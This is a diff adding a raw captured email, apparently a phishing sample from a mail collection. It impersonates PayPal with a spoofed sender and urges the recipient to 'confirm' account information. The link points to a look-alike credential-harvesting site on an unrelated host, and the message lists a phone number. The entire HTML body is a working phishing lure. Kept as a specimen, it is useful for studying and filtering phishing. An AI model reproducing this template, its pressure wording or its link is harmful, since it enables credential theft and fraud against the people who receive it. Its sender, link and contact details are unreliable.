@@ -1,0 +1,131 @@
+Return-Path: <paypal@service.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id E14AFF40B2
+	for <jose@login.monkey.org>; Thu,  5 Mar 2015 19:45:07 -0600 (CST)
+Received: from smtpin07.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id A464D1846F9
+	for <jose@login.monkey.org>; Fri,  6 Mar 2015 01:45:07 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 69933426654.07.top27_2caafaf25972f
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=service.com
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 10,1,0,91683f2ed24d0d79,d41d8cd98f00b204,paypal@service.com,:,RULES_HIT:2:41:72:152:355:375:379:474:541:581:856:962:967:969:973:978:981:983:988:989:1026:1189:1208:1224:1260:1263:1311:1313:1314:1345:1381:1431:1433:1434:1436:1437:1515:1516:1517:1535:1571:1588:1589:1592:1593:1594:1714:1730:1747:1777:1792:1803:2198:2199:2380:2393:2525:2527:2538:2539:2543:2551:2560:2563:2682:2685:2859:2890:2892:2894:2902:2909:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3024:3138:3139:3140:3141:3142:3350:3585:3586:3865:3867:3871:3872:3873:3889:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:3976:3991:4000:4042:4051:4120:4321:4362:4605:5007:6119:6238:6248:6261:6669:6674:6678:7903:8515:8518:8583:8603:8797:9025:9040:9059:9388:9411:9416:9908:10004:10049:11257:11658:11914:12043:12050:12315:12555:12679:12698:12737:12764:12776:12812:12891:12955:12958:12959:12961:12967:12968:12973:13161:13229:13870:14096:14134:21080:21094,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,Do
+X-HE-Tag: top27_2caafaf25972f
+X-Filterd-Recvd-Size: 9116
+Received: from mail-proxy.simpleviewinc.com (unknown [204.17.36.2])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Fri,  6 Mar 2015 01:45:06 +0000 (UTC)
+Received: from VM-STAGE-3 ([172.40.19.124]) by mail-proxy.simpleviewinc.com with Microsoft SMTPSVC(7.0.6002.18264);
+	 Thu, 5 Mar 2015 18:43:12 -0700
+Date: Thu, 5 Mar 2015 18:45:06 -0700 (MST)
+From: PayPal <PayPal@service.com>
+To: jose@monkey.org
+Message-ID: <461558761.172810.1425606306134.JavaMail.VM-STAGE-3$@mail-proxy.asp.local>
+Subject:  PayPal: View your recent activity
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Mailer: ColdFusion 9 Application Server
+X-OriginalArrivalTime: 06 Mar 2015 01:43:12.0598 (UTC) FILETIME=[E83CF760:01D057AE]
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 27
+
+<html>
+<head>
+  <meta http-equiv="Content-Language" content="fr">
+  <meta http-equiv="Content-Type"
+ content="text/html; charset=windows-1252">
+  <title>Letter Ppl By Me</title>
+</head>
+<body>
+<span
+ style="border-collapse: separate; color: rgb(0, 0, 0); font-family: Times New Roman; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 20px; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-size: medium;"
+ class="Apple-style-span">
+<span
+ style="color: rgb(84, 84, 84); font-family: Tahoma,Verdana,Arial,sans-serif; font-size: 13px; line-height: 17px;"
+ class="Apple-style-span">
+<table style="line-height: 17px;" align="center" border="0"
+ cellpadding="0" cellspacing="0" width="600">
+  <tbody style="line-height: 17px;">
+    <tr style="line-height: 17px;" class="header">
+      <td style="line-height: 17px;" valign="right" width="5"> </td>
+      <td style="line-height: 17px;" align="left" width="595"><i
+ style="color: rgb(0, 0, 0); font-family: Arial,sans-serif; font-size: 15px; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">
+      <b><font face="Tahoma" size="6"><font color="#003366">Pay</font><font
+ color="#336699">Pal</font></font></b></i>
+      <p><span
+ style="font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; line-height: 15px; font-size: 12px; color: rgb(159, 159, 159); font-family: Arial,Helvetica,sans-serif; background-color: rgb(255, 255, 255);">
+This is an automated email, please do not reply</span><span
+ style="color: rgb(84, 84, 84); font-family: Tahoma,Verdana,Arial,sans-serif; font-size: 13px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 17px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; display: inline ! important; float: none; background-color: rgb(255, 255, 255);">
+      </span></p>
+      </td>
+    </tr>
+    <tr style="line-height: 17px;" class="ecxhorizontal-bar">
+      <td style="line-height: 17px;" colspan="2" height="14"
+ valign="bottom">
+      </td>
+    </tr>
+    <tr style="line-height: 17px;">
+      <td style="line-height: 17px;" colspan="2">
+      <h1
+ style="margin: 0px 0px 5px; padding: 10px 0px 0px; font-style: normal; font-variant: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; line-height: 26px; color: rgb(51, 102, 153); font-weight: normal; font-family: Arial,Helvetica,sans-serif; background-color: rgb(255, 255, 255);"><font
+ size="4">Dear User</font></h1>
+      <p
+ style="margin: 0px 0px 1.35em; padding: 0px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; line-height: 24px; font-size: 19px; color: rgb(51, 102, 153); font-family: Arial,Helvetica,sans-serif; background-color: rgb(255, 255, 255);">
+You Must Confirm Your Information!</p>
+      <p
+ style="margin: 0px 0px 1.35em; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-size: 14px; font-family: Arial,Helvetica,sans-serif; color: rgb(84, 84, 84); background-color: rgb(255, 255, 255);">
+Please click on the following link to Confirm It:</p>
+      <p
+ style="margin: 0px 0px 1.35em; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-size: 14px; font-family: Arial,Helvetica,sans-serif; color: rgb(84, 84, 84); background-color: rgb(255, 255, 255);">
+      <b style="line-height: 18px; font-weight: bold;"><a rel="nofollow"
+ target="_blank" class="daria-goto-anchor"
+ style="line-height: 18px; font-weight: inherit; text-decoration: underline; color: rgb(51, 102, 153); cursor: pointer;"
+ href="http://www.customer-info-web-pp.esy.es/Security-Account/Login/index/index.html"> Click
+here to Confirm Your Account Information.</a></b></p>
+      <p
+ style="margin: 0px 0px 1.35em; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-size: 14px; font-family: Arial,Helvetica,sans-serif; color: rgb(84, 84, 84); background-color: rgb(255, 255, 255);">
+You Must Confirm Your Information To Save It .</p>
+      <span
+ style="font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; line-height: 22px; font-size: 17px; color: rgb(51, 102, 153); font-family: Arial,Helvetica,sans-serif; background-color: rgb(255, 255, 255);">
+Thanks You For Helping,</span><span
+ style="color: rgb(51, 102, 153); font-family: Arial,sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">
+      </span><br
+ style="color: rgb(51, 102, 153); font-family: Arial,sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; line-height: 17px; background-color: rgb(255, 255, 255);">
+      <span
+ style="font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; line-height: 19px; color: rgb(51, 102, 153); font-family: Arial,Helvetica,sans-serif; background-color: rgb(255, 255, 255);">
+The Team</span>
+      <p
+ style="margin: 0px 0px 1.35em; padding: 10px 0px 0px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-size: 12px; color: rgb(84, 84, 84); font-family: Arial,Helvetica,sans-serif; background-color: rgb(255, 255, 255);"><span
+ style="line-height: 18px; font-size: 14px; font-weight: bold; font-family: Arial,Helvetica,sans-serif;">
+Need Assistance?</span><br style="line-height: 15px;">
+We're happy to help by phone at<span class="Apple-converted-space"> </span><span
+ class="wmi-callto">1-518-741-2708</span>,
+Monday to Friday 9:00am to 5:00 pm EST, or by email<br
+ style="line-height: 15px;">
+Copyright 2015. All rights reserved.</p>
+      <p
+ style="margin: 0px 0px 1.35em; font-family: Arial,sans-serif; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-size: 11px; color: rgb(0, 51, 102); background-color: rgb(255, 255, 255);">
+Email ID: 18460</p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<table style="line-height: 17px;" align="center" border="0"
+ cellpadding="0" cellspacing="0" width="600">
+  <tbody style="line-height: 17px;">
+    <tr style="line-height: 17px;">
+      <td style="line-height: 17px;"> </td>
+    </tr>
+  </tbody>
+</table>
+</span></span>
+</body>
+</html>
